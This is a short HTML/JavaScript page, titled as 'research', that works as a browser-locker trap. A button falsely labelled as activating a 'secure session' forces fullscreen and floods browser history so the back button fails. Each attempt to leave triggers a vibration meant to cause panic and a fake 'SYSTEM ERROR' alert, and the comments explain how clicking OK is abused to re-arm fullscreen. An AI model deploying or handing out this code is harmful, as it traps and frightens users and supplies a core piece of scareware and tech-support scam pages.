<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Research: High-Impact UI Trap</title>
    <style>
        body { 
            background: #000; color: #00ff00; font-family: monospace; 
            text-align: center; display: flex; align-items: center; 
            justify-content: center; height: 100vh; margin: 0;
            cursor: pointer; /* Biar user klik di mana saja */
        }
        .start-btn {
            padding: 20px 40px; font-size: 1.2rem; background: #d93025;
            color: white; border: none; border-radius: 10px;
        }
    </style>
</head>
<body>

    <button class="start-btn" onclick="startTrap()">AKTIFKAN SESI AMAN</button>

    <script>
        let isTrapped = false;

        function startTrap() {
            isTrapped = true;
            lockDown();
        }

        // Fungsi Inti untuk Mengunci UI
        function lockDown() {
            console.log("[!] Locking Down UI...");

            // 1. Fullscreen
            const el = document.documentElement;
            if (el.requestFullscreen) el.requestFullscreen();
            else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();

            // 2. History Flooding
            for (let i = 0; i < 50; i++) {
                window.history.pushState({p: i}, "", "?locked=" + Math.random().toString(36).substring(7));
            }
        }

        // DETEKSI USER COBA KELUAR (Back Button)
        window.onpopstate = function() {
            if (!isTrapped) return;

            // Getaran (opsional biar panik)
            if (navigator.vibrate) navigator.vibrate([300, 100, 300]);

            // Munculkan Alert Palsu
            // Kuncinya: Klik OK di sini dianggap User Gesture baru!
            alert("⚠️ SYSTEM ERROR ⚠️\nNavigasi diblokir untuk keamanan data.\n\nKlik OK untuk me-lockdown kembali sesi Anda.");

            // USER KLIK OK -> TRAP AKTIF LAGI
            // Kita kasih delay mikro agar browser sempat memproses alert-close
            setTimeout(() => {
                lockDown();
            }, 100);
        };
    </script>
</body>
</html>
